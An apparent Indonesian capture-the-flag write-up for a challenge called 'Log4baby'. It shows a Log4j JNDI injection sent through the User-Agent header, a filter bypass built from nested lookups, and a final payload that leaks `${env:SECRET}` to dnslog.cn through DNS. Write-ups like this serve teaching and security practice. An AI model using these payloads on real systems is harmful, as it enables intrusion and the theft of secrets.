# Writeup Log4baby
Website tersebut melakukan logging terhadap *browser* yang digunakan oleh user. Sehingga, kita dapat melakukan GET request dengan mengubah header "User-Agent", dengan payload yaitu lookup JNDI. Terdapat beberapa filter, tetapi kita dapat mem-bypassnya dengan lookup kondisional: `${${::-j}ndi:${::-l}dap:something`. 

![img](https://cdn.discordapp.com/attachments/815844122673938453/997278435200225280/unknown.png)

Lalu, tinggal leak secretnya. Kita dapat menggunakan `${env:SECRET}`, lalu menggunakan dns logger untuk mendapatkan daftar DNS lookup yang dilakukan, seperti melalui dnslog.cn. Sehingga, payload menjadi: `${${::-j}ndi:${::-l}dap://${env:SECRET}.<token>.dnslog.cn/`.